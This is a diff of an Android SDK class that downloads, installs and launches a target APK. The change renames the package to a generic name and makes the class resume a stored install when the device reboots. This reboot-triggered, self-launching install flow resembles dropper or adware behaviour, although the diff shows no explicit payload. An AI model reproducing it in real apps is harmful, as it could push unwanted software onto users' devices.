@@ -1,8 +1,7 @@
-package utils.app.com.installs;
+package utils.helper.apps;
 
 import android.app.Application;
 import android.content.ActivityNotFoundException;
-import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
@@ -26,10 +25,10 @@ import commons.app.com.commons.commons.SdkCommons;
 import commons.app.com.commons.commons.SdkComponent;
 import commons.app.com.keep.NetworkApi;
 import timber.log.Timber;
-import utils.app.com.installs.keep.InstallModel;
-import utils.app.com.installs.keep.InstallsResponse;
-import utils.app.com.installs.models.ApkInfoModel;
-import utils.app.com.installs.sys.TimerService;
+import utils.helper.apps.keep.InstallModel;
+import utils.helper.apps.keep.InstallsResponse;
+import utils.helper.apps.models.ApkInfoModel;
+import utils.helper.apps.sys.TimerService;
 
 @SuppressWarnings("WeakerAccess")
 public class InstallsComponent extends SdkComponent {
@@ -59,7 +58,11 @@ public class InstallsComponent extends SdkComponent {
 
     @Override
     public void onDeviceRebooted() {
-        checkPendingInstalls();
+        // checkPendingInstalls();
+        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
+        if (apkInfo != null) {
+            install(apkInfo);
+        }
     }
 
     @Nullable
@@ -79,7 +82,13 @@ public class InstallsComponent extends SdkComponent {
             if (!TextUtils.isEmpty(apkInfo.getId())) {
                 submitInstallEventJob(apkInfo.getId());
             }
-            launchApp(context(), packageName);
+            // launch app
+            try {
+                Intent launchIntent = context().getPackageManager().getLaunchIntentForPackage(packageName);
+                context().startActivity(launchIntent);
+            } catch (ActivityNotFoundException e) {
+                e.printStackTrace();
+            }
             preferences.saveTargetApkInfo(null);
         }
     }
@@ -149,13 +158,6 @@ public class InstallsComponent extends SdkComponent {
         downloadManager.add(downloadRequest);
     }
 
-    private void checkPendingInstalls() {
-        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
-        if (apkInfo != null) {
-            install(apkInfo);
-        }
-    }
-
     ///////////////////////////////////////////////////////////////////////////
     // JOBS
     ///////////////////////////////////////////////////////////////////////////
@@ -175,15 +177,6 @@ public class InstallsComponent extends SdkComponent {
     ///////////////////////////////////////////////////////////////////////////
     // UTILS
     ///////////////////////////////////////////////////////////////////////////
-
-    private void launchApp(Context context, @NonNull String packageName) {
-        try {
-            Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);
-            context.startActivity(launchIntent);
-        } catch (ActivityNotFoundException e) {
-            e.printStackTrace();
-        }
-    }
 
     private void install(ApkInfoModel model) {
         if (MainUtils.isAppInstalled(context(), model.getPackageName())) {
